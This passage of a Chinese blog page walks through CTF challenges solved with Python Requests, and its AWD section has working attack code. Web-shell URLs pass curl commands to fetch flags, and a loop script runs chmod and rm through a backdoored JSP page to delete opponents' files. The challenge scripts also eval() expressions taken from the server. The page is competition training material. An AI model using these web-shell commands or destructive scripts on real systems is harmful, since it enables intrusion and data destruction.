+cookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> PHPSESSID<span class="token punctuation">}</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> post<span class="token punctuation">,</span> cookies <span class="token operator">=</span> cookie<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="题目-秋名山老司机"><a href="#题目-秋名山老司机" class="headerlink" title="题目 秋名山老司机"></a>题目 秋名山老司机</h3><p>题目来源：bugku<br>题目链接：<a target="_blank" rel="noopener" href="http://123.206.87.240:8002/qiumingshan/">http://123.206.87.240:8002/qiumingshan/</a><br>题目信息：<br><img src="https://i.loli.net/2020/05/20/pZaRetgBlxoy2mJ.png"></p>
+<blockquote>
+<p>依旧是跟前两题差不多，前面两题均是对响应头中与flag相关的属性做解码处理，然后快速发送一个 POST 请求得到 flag 值。而本题要求计算响应内容中的表达式，将结果用 POST 请求发送回服务器换取 flag 值。同样要利用会话对象 Session()，否则提交结果的时候，重新生成了一个新的表达式，结果自然错误。</p>
+</blockquote>
+<p>打开题目，查看源码<br><img src="https://i.loli.net/2020/05/20/VzFaq1GSdIZ4uUO.png"><br>根据题目意思 必须2秒内计算给出算式的值<br>但是不知道POST的key是什么，刷新页面再看看，得到请求参数的 key 值为<code>value</code><br><img src="https://i.loli.net/2020/05/20/UJlxr18MNpqyTWg.png"><br>经过研究发现算式会改变，再加上必须2秒内提交，显然必须要用脚本来跑了，因此直接上 Python 脚本解题</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># python 2</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re <span class="token comment" spellcheck="true"># 正则表达式</span>
+url <span class="token operator">=</span> <span class="token string">'http://123.206.87.240:8002/qiumingshan/'</span>
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content
+<span class="token comment" spellcheck="true"># search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。</span>
+expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+\-*])+(\d+)'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># search() 的第一个参数是匹配的正则表达式，第二个参数是要匹配的字符串</span>
+sum <span class="token operator">=</span> eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># eval()自动计算出结果，</span>
+post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span> sum<span class="token punctuation">}</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> post<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>脚本解释</strong>：</p>
+<pre class="line-numbers language-python"><code class="language-python">expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+\-*])+(\d+)'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>前面的一个<code>r</code>表示字符串为非转义的原始字符串，让编译器忽略反斜杠，也就是忽略转义字符。但是这个字符串里没有反斜杠，所以这个<code>r</code>可有可无</p>
+<p><code>\d+</code>代表一个或多个数字<br><code>[+\-*]</code>匹配一个加号，或一个减号，或一个乘号，注意减号在中括号内是特殊字符，要用反斜杠转义；<br><code>(\d+[+\-*])+</code>代表一个或多个由数字与运算符组成的匹配组；最后再加上剩下的一个数字<code>(\d+)</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-reg-expressions.html">Python 正则表达式</a><br><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/2.7/library/re.html">正则表达式</a><br>运行脚本，就有一定的概率可以获得flag,经尝试与猜测只有当<code>Give me value post about...</code>界面出现提交才能得到flag<br>所以多运行几次脚本flag就能得到了</p>
+<p><img src="https://i.loli.net/2020/05/20/yctYRWMpibT1wHP.png"></p>
+<h3 id="题目-快速口算"><a href="#题目-快速口算" class="headerlink" title="题目 快速口算"></a>题目 快速口算</h3><p>题目来源：网络信息安全攻防学习平台<br>题目链接：<a target="_blank" rel="noopener" href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php">http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php</a><br>题目信息：<br><img src="https://i.loli.net/2020/05/20/xkZeTPyhrtK7Opb.png"></p>
+<blockquote>
+<p>跟上一题原理一样，唯一不同就是正则表达式稍有变动，因为两题算式形式略有不同</p>
+</blockquote>
+<p>打开题目，查看源码<br><img src="https://i.loli.net/2020/05/20/YmG8RXtfcyETKhM.png"><br>根据题目意思 必须2秒内计算给出算式的值，源码中得到请求参数的 key 值为<code>v</code><br>解题脚本：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># Python 2</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re <span class="token comment" spellcheck="true"># 正则表达式</span>
+url<span class="token operator">=</span><span class="token string">"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"</span>
+s<span class="token operator">=</span>requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+r<span class="token operator">=</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content
+expression<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'[0-9+*()]+[)]'</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sum<span class="token operator">=</span>eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span> 
+postdata<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'v'</span><span class="token punctuation">:</span>sum<span class="token punctuation">}</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>postdata<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>0-9+</code>代表一个或多个数字<br><code>+*()</code>匹配一个加号，或一个乘号，或一个括号<br><code>[0-9+*()]+</code>代表一个或多个由数字与运算符组成的匹配组；最后再加上剩下的一个后括号<code>[)]</code><br>运行脚本，得到flag<br><img src="https://i.loli.net/2020/05/20/jt2ZiEkPbwLaJnQ.png"></p>
+<h3 id="题目-cookies欺骗"><a href="#题目-cookies欺骗" class="headerlink" title="题目 cookies欺骗"></a>题目 cookies欺骗</h3><p>题目来源：bugku<br>题目链接：<a target="_blank" rel="noopener" href="http://123.206.87.240:8002/web11/">http://123.206.87.240:8002/web11/</a><br>题目信息：<br><img src="https://i.loli.net/2019/08/09/IVY2q6SJ1inOBFk.png"><br>打开题目，看到一段字符，各种编码尝试之后，未果。。。<br><img src="https://i.loli.net/2019/08/09/8wUNGWz74yhjJPs.png"><br>发现<code>url</code>中的<code>filename</code>的值<code>a2V5cy50eHQ=</code>是<code>base64</code>编码，解码后是<code>keys.txt</code><br>直接访问<code>keys.txt</code>，发现回显的就是刚才的那段字符<br><img src="https://i.loli.net/2019/08/09/VYSfsa2lenBJF6K.png"><br>也就是说<code>filename</code>能读取文件，但是文件名要<code>base64</code>编码<br>因此我们来读取<code>index.php</code>,将其<code>base64</code>编码<br><img src="https://i.loli.net/2019/08/09/Wgu2X9LFCel6vxp.png"><br><code>url</code>中<code>line</code>参数应该是行数，试一下<code>line=1</code><br><img src="https://i.loli.net/2019/08/09/sLUrDAydSgMOlkJ.png"><br>出现一行代码，再试一下<code>line=2</code>显示了不同的代码<br><img src="https://i.loli.net/2019/08/09/QxzrbNmg5GtvwCk.png"><br>由此推断改变<code>line</code>值就能够读取<code>index.php</code>,但是手动改太麻烦，因此我们写一个脚本来读取<code>index.php</code></p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web11/index.php?line='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&amp;filename=aW5kZXgucGhw'</span>
+    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行脚本得到源码<br><img src="https://i.loli.net/2019/08/09/IrajzObsk7SQYug.png"><br>审计代码，<code>cookie</code>必须满足<code>margin=margin</code>才能访问<code>keys.php</code><br>将<code>keys.php</code>进行<code>base64</code>编码<br><img src="https://i.loli.net/2019/08/09/Qxb7LsPZkREtYyO.png"><br>抓包之后，加上<code>Cookie:margin=margin</code><br><img src="https://i.loli.net/2019/08/09/Lo1i7BAJFNlU9bg.png"><br>看了网上也可用Hackbar,执行之后查看源码<br><img src="https://i.loli.net/2019/08/09/CkLSp8PODf3ztnv.png"></p>
+<h2 id="Request在AWD中实战"><a href="#Request在AWD中实战" class="headerlink" title="Request在AWD中实战"></a>Request在AWD中实战</h2><h3 id="题目：JEECMS"><a href="#题目：JEECMS" class="headerlink" title="题目：JEECMS"></a>题目：JEECMS</h3><p>题目来源：2019四川省省赛AWD<br>题目链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YpdKs8BwQpUuCosqNM_-9w">https://pan.baidu.com/s/1YpdKs8BwQpUuCosqNM_-9w</a><br>提取码：kg4y </p>
+<p>ssh连接，将源码down下来，D盾扫描<br><img src="https://blog.xiafeng2333.top/content/images/2019/08/1.jpg"><br>一共四个木马，两个多功能大马<br><img src="https://i.loli.net/2020/05/20/YVCpkEZtAbcIRQ3.png"><br>根据扫出的命令执行漏洞，直接获取flag手工提交</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.200.1.11:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.200.1.12:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.200.1.num:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/</span>
+<span class="token shell-comment comment"># 题目提供的flag所在地 curl http:</span><span class="token comment" spellcheck="true">//192.200.0.70/remoteflag/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>根据漏洞，利用Requests写出宕机脚本，直接删除敌方页面</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+<span class="token keyword">for</span> num <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#这个范围是打的ip是11-43的队伍</span>
+    <span class="token comment" spellcheck="true">#修改要删除页面的权限</span>
+    url<span class="token operator">=</span><span class="token string">'http://192.200.1.'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">':8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=chmod 777 /home/ctf/apache-tomcat-7.0.79/webapps/jeecmsv9f/jeeadmin/jeecms/index.do'</span>
+
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#删除页面</span>
+    url<span class="token operator">=</span><span class="token string">'http://192.200.1.'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">':8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=rm%20/home/ctf/apache-tomcat-7.0.79/webapps/jeecmsv9f/jeeadmin/jeecms/index.do'</span>
+
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+
+    url<span class="token operator">=</span><span class="token string">'http://192.200.1.'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">':8080/jeeadmin/jeecms/index.do'</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://requests.readthedocs.io/zh_CN/latest/">快速上手-Requests</a><br><a target="_blank" rel="noopener" href="https://requests.readthedocs.io/zh_CN/latest/user/advanced.html">高级用法-Requests</a><br><a target="_blank" rel="noopener" href="https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/">详解CTF Web中的快速反弹POST请求</a></p>
+<h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭</p>
+<table>
+  <tbody>
+     <tr>
+         <td style="text-align:center;">支付宝支付</td>
+         <td style="text-align:center;">微信支付</td>
+     </tr>
+   <tr>
+    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
+      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
+  </tr>
+</tbody></table>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jwt1399.top" rel="external nofollow noreferrer">简简</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jwt1399.top/posts/57181.html">https://jwt1399.top/posts/57181.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://jwt1399.top" target="_blank">简简</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Requests/">
+                                    <span class="chip bg-color">Requests</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,linkedin,facebook,twitter,google,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">打</a>
+	<a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        /*max-width: 100%;*/
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+    .v[data-class=v] .vinput {
+     padding: 0px 0px;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论<center>填上邮箱会收到评论回复提醒哦!!!</center></span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/valine/1.4.18/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'Awf92dhT3VWqTfENqbCDoqbA-gzGzoHsz',
+        appKey: '9uN7ODvigK9GAp8CYBz0fOrX',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: '',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '[填上邮箱，会给你发送评论提醒]，ヾﾉ≧∀≦)o 请畅所欲言~',
+        enableQQ: true,
+        boolean: true,
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/38162.html">
+                    <div class="card-image">
+                        
+                        <img src="https://img.jwt1399.top//img/20200824184057.png" class="responsive-img" alt="Web前端三剑客学习笔记">
+                        
+                        <span class="card-title">Web前端三剑客学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+前言一直没有系统的学习HTML,CSS,JS都是东学一点，西学一点，想着暑假得空，便系统的学习下吧，故于此记录之。
+2020.2.25更新：由于本专业开设了《web应用开发》课，于是乎本文档得到了进一步完善。
+HTML
+超文本标记语言（H
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-08-10
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/JavaWeb/" class="post-category">
+                                    JavaWeb
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/49445.html">
+                    <div class="card-image">
+                        
+                        <img src="https://img.jwt1399.top//img/20200824182154.jpg" class="responsive-img" alt="渗透测试-工具篇">
+                        
+                        <span class="card-title">渗透测试-工具篇</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+dirsearch-网站目录结构扫描器
+dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。
+
+安装与使用#安装：
+git clone https://github.com/maurosor
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-08-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tools/" class="post-category">
+                                    Tools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
